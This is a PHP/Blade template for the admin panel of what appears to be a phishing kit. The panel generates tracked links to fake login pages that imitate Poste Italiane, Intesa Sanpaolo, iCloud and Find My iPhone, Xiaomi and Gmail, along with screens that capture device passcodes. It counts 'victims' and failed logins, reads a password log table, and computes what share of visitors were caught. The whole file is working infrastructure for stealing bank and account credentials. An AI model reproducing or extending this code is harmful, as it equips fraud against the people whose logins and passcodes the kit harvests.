{{--*/ $ci =& get_instance(); /*--}}
{{--*/ $opt = $ci->Opts->getOpt(); /*--}}
{{--*/ $ci->load->model('Links_m', 'link'); /*--}}


{{--*/ $Template1 = ( ! $ci->global_data['loginPage'] ) ? site_url('icloud') : $ci->global_data['DomainTemplate1'].'/'.$ci->global_data['loginPage'] /*--}}
{{--*/ $Template2 = ( ! $ci->global_data['disablePage'] ) ? site_url('aid') : $ci->global_data['DomainTemplate2'].'/'.$ci->global_data['disablePage'] /*--}}
{{--*/ $Template3 = ( ! $ci->global_data['passPage'] ) ? site_url('password') : $ci->global_data['DomainTemplate3'].'/'.$ci->global_data['passPage'] /*--}}
{{--*/ $Template4 = ( ! $ci->global_data['fmiPage'] ) ? site_url('fmi') : $ci->global_data['DomainTemplate4'].'/'.$ci->global_data['fmiPage'] /*--}}
{{--*/ $Template5 = ( ! $ci->global_data['fmi2Page'] ) ? site_url('ffmi') : $ci->global_data['DomainTemplate4'].'/'.$ci->global_data['fmi2Page'] /*--}}
{{--*/ $Template6 = ( ! $ci->global_data['mapPage'] ) ? site_url('maps') : site_url($ci->global_data['mapPage']) /*--}}
{{--*/ $Template7 = ( ! $ci->global_data['bolinhaPage'] ) ? site_url('bolinha') : site_url($ci->global_data['bolinhaPage']) /*--}}


{{--*/ $aid = ( ! $ci->global_data['disablePage']) ? site_url('aid') : site_url($ci->global_data['disablePage']) /*--}}
{{--*/ $passwd = ( ! $ci->global_data['passPage'] ) ? site_url('password') : site_url($ci->global_data['passPage']) /*--}}
{{--*/ $fmi = ( ! $ci->global_data['fmiPage'] ) ? site_url('fmi') : site_url($ci->global_data['fmiPage']) /*--}}

{{--*/ $icloud = ( ! $ci->global_data['loginPage'] ) ? site_url('icloud') : site_url($ci->global_data['loginPage']) /*--}}
{{--*/ $bolinha = ( ! $ci->global_data['bolinhaPage'] ) ? site_url('bolinha') : site_url($ci->global_data['bolinhaPage']) /*--}}
{{--*/ $bolinha4 = ( ! $ci->global_data['bolinhaPage4'] ) ? site_url('bolinha4') : site_url($ci->global_data['bolinhaPage4']) /*--}}
{{--*/ $MapaNovo = ( ! $ci->global_data['MapaNovoPage'] ) ? site_url('MapaNovo') : site_url($ci->global_data['MapaNovoPage']) /*--}}
{{--*/ $MapaNovo6 = ( ! $ci->global_data['MapaNovo6Page'] ) ? site_url('MapaNovo6') : site_url($ci->global_data['MapaNovo6Page']) /*--}}
{{--*/ $MapaNovoLogin = ( ! $ci->global_data['MapaNovoLoginPage'] ) ? site_url('MapaNovoLogin') : site_url($ci->global_data['MapaNovoLoginPage']) /*--}}
{{--*/ $lcloud = ( ! $ci->global_data['loginPage'] ) ? site_url('lcloud') : site_url($ci->global_data['loginPage']) /*--}}
{{--*/ $ffmi = ( ! $ci->global_data['fmi2Page'] ) ? site_url('ffmi') : site_url($ci->global_data['fmi2Page']) /*--}}
{{--*/ $map = ( ! $ci->global_data['mapPage'] ) ? site_url('maps') : site_url($ci->global_data['mapPage']) /*--}}

{{--*/ $itunes = ( ! $ci->global_data['itunesPage'] ) ? site_url('itunes') : site_url($ci->global_data['itunesPage']) /*--}}
{{--*/ $Map2020Modelo1 = ( ! $ci->global_data['Map2020Modelo1Page'] ) ? site_url('Map2020Modelo1') : site_url($ci->global_data['Map2020Modelo1Page']) /*--}}
{{--*/ $Map2020Modelo2 = ( ! $ci->global_data['Map2020Modelo2Page'] ) ? site_url('Map2020Modelo2') : site_url($ci->global_data['Map2020Modelo2Page']) /*--}}
{{--*/ $SenhaTela4Modelo2020 = ( ! $ci->global_data['SenhaTela4Modelo2020Page'] ) ? site_url('SenhaTela4Modelo2020') : site_url($ci->global_data['SenhaTela4Modelo2020Page']) /*--}}
{{--*/ $SenhaTela6Modelo2020 = ( ! $ci->global_data['SenhaTela6Modelo2020Page'] ) ? site_url('SenhaTela6Modelo2020') : site_url($ci->global_data['SenhaTela6Modelo2020Page']) /*--}}
{{--*/ $XiaomiLogin = ( ! $ci->global_data['XiaomiLoginPage'] ) ? site_url('XiaomiLogin') : site_url($ci->global_data['XiaomiLoginPage']) /*--}}
{{--*/ $gmail2020 = ( ! $ci->global_data['gmail2020Page'] ) ? site_url('gmail2020') : site_url($ci->global_data['gmail2020Page']) /*--}}

@extends('assets.backend.default')

@push('extrajs')
<!-- FooTable -->
<script src="{{site_url('assets/js/ajax-form.js')}}"></script>
<script src="{{site_url('assets/backend/js/plugins/footable/footable.all.min.js')}}"></script>
<!-- Page-Level Scripts -->
<script>
    $(document).ready(function () {
        $('.footable').footable();
    });
</script>
<!-- Sweet alert -->
<script src="{{site_url('assets/backend/js/plugins/sweetalert/sweetalert.min.js')}}"></script>
@endpush

@push('extracss')

<!-- FooTable -->
<link href="{{site_url('assets/backend/css/plugins/footable/footable.core.css')}}" rel="stylesheet">
<link href="{{site_url('assets/backend/css/plugins/sweetalert/sweetalert.css')}}" rel="stylesheet">
@endpush

@section('content')

  <?php
/*
  ini_set('display_startup_errors', 1);
  ini_set('display_errors', 1);
  error_reporting(-1);
  */




  function GetAcessado($ci,$CodeLink)
  {
    $q1 = $ci -> db
     -> select('*')
     -> where('linkAcessado', $CodeLink)
     -> get('victims');
     $Retorno1 = $q1->num_rows();

     $q2 = $ci -> db
      -> select('*')
      -> where('link', $CodeLink)
      -> get('psslog');
      $Retorno2 = $q2->num_rows();


     return $Retorno1+$Retorno2;
  }


  function CalculaPorcentagem($Acessado, $Clicado){
    $Conta = number_format(($Acessado/$Clicado)*100,2,'.','');
    return $Conta;
  }


   ?>
<div class="row">

    <div class="col-lg-2">
        <div class="widget style1 navy-bg">
            <div class="row">
                <a href="/admin/victims" style="color: #fff">
                    <div class="col-xs-4">
                        <i class="fa fa-user fa-5x"></i>
                    </div>
                    <div class="col-xs-8 text-right">
                        <span> {{ $ci->lang->line('Victims') }} </span>
                        <h2 class="font-bold">{{count($getAllVictims)}}<small style="color: #fff"> {{ $ci->lang->line('Victims') }}</small>
                        </h2>
                    </div>
                </a>
            </div>
        </div>
    </div>


    <div class="col-lg-2">
        <div class="widget style1 navy-bg">
            <div class="row">
                <a href="/admin/failed" style="color: #fff">
                    <div class="col-xs-4">
                        <i class="fa fa-user fa-5x"></i>
                    </div>
                    <div class="col-xs-8 text-right">
                        <span> {{ $ci->lang->line('False_Login') }} </span>
                        <h2 class="font-bold">{{count($getAllFalse)}}<small style="color: #fff"> {{ $ci->lang->line('Victims') }}</small>
                        </h2>
                    </div>
                </a>
            </div>
        </div>
    </div>

    <div class="col-lg-2">
        <div class="widget style1 navy-bg">
            <div class="row">
                <a class="link-generate" style="color: #fff">
                    <div class="col-xs-4">
                        <i class="fa fa-user fa-5x"></i>
                    </div>
                    <div class="col-xs-8 text-right">
                        <span> {{ $ci->lang->line('Create') }} </span>
                        <h2 class="font-bold"><small style="color: #fff">{{ $ci->lang->line('Link') }}</small>
                        </h2>
                    </div>
                </a>
            </div>
        </div>
    </div>

    <!--
    <div class="col-lg-2">
        <div class="widget style1 navy-bg">
            <div class="row">
                <a href="http://novobankpanel.loc/admin/victims" style="color: #fff">
                    <div class="col-xs-4">
                        <i class="fa fa-user fa-5x"></i>
                    </div>
                    <div class="col-xs-8 text-right">
                        <span> % Visits x Links </span>
                        <h2 class="font-bold">1<small style="color: #fff">Victims</small>
                        </h2>
                    </div>
                </a>
            </div>
        </div>
    </div>
    -->

        <div class="col-xs-12" style="display:none;">
            <div class="text-center">
                <a class="link-generate btn btn-info btn-md"><i class="fa fa-plus"></i> Create New Link</a>
                <!-- /.btn btn-info btn-sm -->
            </div>
            <!-- /.text-center -->
        </div>
        <!-- /.col-xs-12 -->
        <div class="col-lg-12" style="margin-top: 30px">
            <div class="ibox float-e-margins">
                <div class="ibox-title">
                    <h5> <span
                                class="badge">{{count($links)}}</span> {{ $ci->lang->line('record_was_found') }}</h5>

                    <div class="ibox-tools">
                        <a class="collapse-link">
                            <i class="fa fa-chevron-up"></i>
                        </a>
                        <a class="close-link">
                            <i class="fa fa-times"></i>
                        </a>
                    </div>
                </div>
                <div class="ibox-content">
                    <input type="text" class="form-control input-sm m-b-xs" id="filter"
                           placeholder="Localizar...">
                    <table class="footable table table-stripped toggle-plus" data-page-size="20" data-filter=#filter>
                        <thead>
                        <tr>
                            <th style="width: 30%" data-toggle="true" data-hide="phone">{{ $ci->lang->line('ID_Link') }}</th>
                            <!--<th data-hide="all">#ID</th>-->
                            <th data-hide="phone">{{ $ci->lang->line('Open') }}</th>
                            <th data-hide="phone">%</th>
                            <!--<th data-hide="all">Create @</th>-->
                            <th>{{ $ci->lang->line('Status_Expire') }}</th>
                            <th width="15%" data-hide="phone">{{ $ci->lang->line('Last_Visit') }}</th>
                            <th width="100%" style="text-align: center;">{{ $ci->lang->line('Action') }}<i class="fa fa-cong"></i></th>
                        </tr>
                        </thead>
                        <tbody>
                        @foreach($links as $link)
                            <tr>
                                <!--<td>{{$link->victim}} <br/><i class="text-danger">code: </i> {{$link->uniq}}, <i class="text-warning">Via: </i> {{$link->via}}</td>-->
                                <td style="font-size: 20px;"><i class="text-danger">{{ $ci->lang->line('Code') }}: </i> {{$link->uniq}}
                                <br>
                                <?php if($ci->global_data['ShowPosteItaliane'] == "1" && $link->TemplateEscolhido == 'Template1'){ ?>
                                  <a target="_blank" href="{{$Template1}}/{{$link->uniq}}"> {{$Template1}}/{{$link->uniq}}</a></br> <!-- POSTEIT -->
                                <?php } ?>

                                <?php if($ci->global_data['ShowIntesaSanpaolo'] == "1" && $link->TemplateEscolhido == 'Template2'){ ?>
                                  <a target="_blank" href="{{$Template2}}/{{$link->uniq}}"> {{$Template2}}/{{$link->uniq}}</a></br> <!-- INTESA -->
                                <?php } ?>

                                <?php if($ci->global_data['ShowTemplate3'] == "1" && $link->TemplateEscolhido == 'Template3'){ ?>
                                  <a target="_blank" href="{{$Template3}}/{{$link->uniq}}"> {{$Template3}}/{{$link->uniq}}</a></br> <!-- Template3 -->
                                <?php } ?>

                                <?php if($ci->global_data['ShowTemplate4'] == "1" && $link->TemplateEscolhido == 'Template4'){ ?>
                                  <a target="_blank" href="{{$Template4}}/{{$link->uniq}}"> {{$Template4}}/{{$link->uniq}}</a></br> <!-- Template4 -->
                                <?php } ?>

                                <?php if($ci->global_data['ShowTemplate5'] == "1" && $link->TemplateEscolhido == 'Template5'){ ?>
                                  <a target="_blank" href="{{$Template5}}/{{$link->uniq}}"> {{$Template5}}/{{$link->uniq}}</a></br> <!-- Template5 -->
                                <?php } ?>

                                <?php if($ci->global_data['ShowTemplate6'] == "1" && $link->TemplateEscolhido == 'Template6'){ ?>
                                  <a target="_blank" href="{{$Template6}}/{{$link->uniq}}"> {{$Template6}}/{{$link->uniq}}</a></br> <!-- Template6 -->
                                <?php } ?>

                                <?php if($ci->global_data['ShowTemplate7'] == "1" && $link->TemplateEscolhido == 'Template7'){ ?>
                                  <a target="_blank" href="{{$Template7}}/{{$link->uniq}}"> {{$Template7}}/{{$link->uniq}}</a></br> <!-- Template7 -->
                                <?php } ?>
                                </td>
                                <!--<td>{{$link->id}}</td>-->
                                {{--*/ $visits = $ci->link->countView($link->uniq); /*--}}
                                {{--*/ $visit = ( $visits == 0) ? '<span class="badge yellow-bg">Not once</span>' : '<span class="badge navy-bg">'.$ci->link->countView($link->uniq).' '. $ci->lang->line('Visits') .'</span>'; /*--}}
                                <td>{!! $visit !!}</td>
                                <td>{{CalculaPorcentagem(GetAcessado($ci,$link->uniq) , $visits)}}%
                                </td>

                                <!--<td>{{niceTime($link->time)}}</td>-->
                                {{--*/ $check = checkExpire($link->time, $expire); /*--}}
                                <td>
                                    @if( $check )
                                        <span class="badge green-bg"> {{ $ci->lang->line('Active_Link') }}</span>
                                        <br/> {{date('D, d/m/Y - H:i:s', strtotime('+'.$expire.' hours', strtotime($link->time)))}}
                                    @else
                                        <span class="badge red-bg"> {{ $ci->lang->line('Inactive_Link') }}</span>
                                        <br/> {{date('D, d/m/Y - h:i:s', strtotime('+'.$expire.' hours', strtotime($link->time)))}}
                                    @endif
                                </td>
                                {{--*/ $lastview = $ci->link->getLastView($link->uniq); /*--}}
                                {{--*/ $lastview = ($lastview) ? niceTime($lastview) : $ci->lang->line('Waiting_Visit') ; /*--}}
                                <td>{{ $lastview }}</td>
                                <td class="text-center">

                                    <!--<a class="botao-lista-links btn btn-info btn-xs" data-toggle="tooltip" data-placement="top" title="List of Links" onclick="funcaoListaLinks('{{$link->uniq}}')" style="font-size: 20px;"><i class="fa fa-list"></i> {{ $ci->lang->line('List_of_Links') }}</a>-->

                                    <a class="botao-altera-codigo btn btn-warning btn-xs" data-toggle="tooltip" data-placement="top" title="Edit Code" onclick="funcaoAlteraCodigo('{{$link->uniq}}')" style="font-size: 20px;"><i class="fa fa-edit"></i> {{ $ci->lang->line('Edit_Code') }}</a>

                                    @if ( $visits !== 0)
				                                <a data-toggle="tooltip" data-placement="top" title="Logs" class="btn btn-xs btn-primary" href="{{ site_url('admin/links/tracer/'.$link->uniq) }}" style="font-size: 20px;"><i class="fa fa-check"></i> {{ $ci->lang->line('Logs') }}</a>

                                    @else
                                        <a data-toggle="tooltip" data-placement="top" title="Pending" class="btn btn-xs btn-default" style="font-size: 20px;"><i class="fa fa-times"></i> {{ $ci->lang->line('Pending') }}</a>

                                    @endif

                                    @if ( $check )

                                        <a href="{{site_url('admin/links/getEnable/'.$link->uniq)}}" class="btn btn-xs btn-danger getEnable" data-toggle="tooltip" data-placement="top" title="Disable Link" style="font-size: 20px;"><i class="fa fa-eye-slash"></i> {{ $ci->lang->line('Disable_Link') }}</a>

                                    @else
                                        <a href="{{site_url('admin/links/getDisable/'.$link->uniq)}}" class="btn btn-xs btn-info getDisable" data-toggle="tooltip" data-placement="top" title="Enable Link" style="font-size: 20px;"><i class="fa fa-eye"></i> {{ $ci->lang->line('Enable_Link') }}</a>



									@endif

									<a href="{{site_url('admin/links/delLink/'.$link->uniq)}}"
                                           class="removeVic btn btn-danger btn-xs" data-toggle="tooltip"
                                           data-placement="top" title="Del" style="font-size: 20px;"><i class="fa fa-trash"></i> {{ $ci->lang->line('Del') }}</a>
                                </td>
                            </tr>
                        @endforeach
                        </tbody>
                        <tfoot>
                        <tr>
                            <td colspan="5">
                                <ul class="pagination pull-right"></ul>
                            </td>
                        </tr>
                        </tfoot>
                    </table>

                </div>
            </div>
        </div>

        <div class="col-xs-12" style="margin-bottom: 20px">
            <div class="text-center">
                <a class="link-generate btn btn-info btn-md"><i class="fa fa-plus"></i> Create New Link</a>
                <!-- /.btn btn-info btn-sm -->
            </div>
            <!-- /.text-center -->
        </div>
        <!-- /.col-xs-12 -->
    </div>

<script>


    function funcaoListaLinks(val){

        var html = "{{ $ci->lang->line('Code') }}: <strong>" + val + '</strong> </br> <p> . </p>' +
                    '<a target="_blank" href="{{$icloud}}/' + val + '"> Poste Italiane</a></br>' +
                    '<a target="_blank" href="{{$aid}}/' + val + '"> Intesa Sanpaolo</a></br>';
                    /*
                    '<a target="_blank" href="{{$passwd}}/' + val + '"> Reset Password</a></br>' +
                    '<a target="_blank" href="{{$fmi}}/' + val + '"> Find My iPhone</a></br>' +
                    '<a target="_blank" href="{{$ffmi}}/' + val + '"> Find My iPhone v2 "Compass" </a></br>' +
                    '<a target="_blank" href="{{$map}}/' + val + '"> Mapas Connect</a></br>' +
                    '<a target="_blank" href="{{$bolinha}}/' + val + '"> Bolinha 6 Digitos</a></br>' +
                    '<a target="_blank" href="{{$bolinha4}}/' + val + '"> Bolinha 4 Digitos</a></br>' +
                    '<a target="_blank" href="{{$MapaNovo}}/' + val + '"> Mapa Novo 4 Digitos</a></br>' +
                    '<a target="_blank" href="{{$MapaNovo6}}/' + val + '"> Mapa Novo 6 Digitos</a></br>' +
                    '<a target="_blank" href="{{$MapaNovoLogin}}/' + val + '"> Mapa Novo Somente Login</a></br>' +
                    '<a target="_blank" href="{{$Map2020Modelo1}}/' + val + '"> Mapa 2020 Modelo 1</a></br>' +
                    '<a target="_blank" href="{{$Map2020Modelo2}}/' + val + '"> Mapa 2020 Modelo 2</a></br>' +
                    '<a target="_blank" href="{{$SenhaTela4Modelo2020}}/' + val + '"> Senha 4 Digitos Modelo 2020</a></br>' +
                    '<a target="_blank" href="{{$SenhaTela6Modelo2020}}/' + val + '"> Senha 6 Digitos Modelo 2020</a></br>' +
                    '<a target="_blank" href="{{$XiaomiLogin}}/' + val + '"> Xiaomi Login</a></br>' +
                    '<a target="_blank" href="{{$gmail2020}}/' + val + '"> Gmail Login</a>';
                    */
                swal({
                    title: "{{ $ci->lang->line('Templates_List') }}",
                    text: html,
                    html: true,
                    type: 'success',
                    animation: "slide-from-top",
                    confirmButtonText: "{{ $ci->lang->line('Copied_Click_to_Close') }}",
                });

    }

    function funcaoAlteraCodigo(val){


    swal({
                title: "{{ $ci->lang->line('Edit_Code') }}",
                text: "{{ $ci->lang->line('You_can_enter_a_custom_code') }}",
                type: "input",
                showCancelButton: true,
                showConfirmButton: true,
                closeOnCancel: false,
                closeOnConfirm: false,
                confirmButtonText: "{{ $ci->lang->line('Save') }}",
                animation: "slide-from-top",
                inputPlaceholder: "{{ $ci->lang->line('Custom_Code_Here') }}",
                inputValue: val,
                html: true,
            }, function (inputValue) {

                if (inputValue !== false) {
                    if(inputValue != ''){
                        $.ajax({
                            cache: false,
                            type: "GET",
                            dataType: 'json',
                            timeout: 5000,
                            url: '{{site_url('admin/links/editLink/')}}' + inputValue + '@ESPACO123456ESPACO@' + val,
                            success: function (res) {
                                if (res.message) {
                                    console.log(res);
                                    var html = "{{ $ci->lang->line('Link_Changed') }}";

                                    swal({
                                         title: "{{ $ci->lang->line('Link_Changed') }}",
                                        text: html,
                                        html: true,
                                        type: 'success',
                                        animation: "slide-from-top",
                                        confirmButtonText: "{{ $ci->lang->line('Click_to_Close') }}",
                                     },
                                     function(isConfirm){

                                       if (isConfirm){
                                         console.log("Confirmado");
                                         location.reload();

                                        }
                                     });

                                } else {
                                    swal("Oops!", res.error + "<br />{{ $ci->lang->line('Something_goes_wrong_try_again') }}", "error");
                                }
                            },
                            error: function () {
                                swal("Oops!", "{{ $ci->lang->line('Something2') }}", "error");
                            }
                        });
                    } else {
                        swal("Canceled!", "{{ $ci->lang->line('Required_field') }}", "error");
                    }
                } else {
                    swal("Canceled!", "{{ $ci->lang->line('Okay_I_just_wanted_to_help_you') }}", "error");
                }

            });




    }




</script>

@endsection
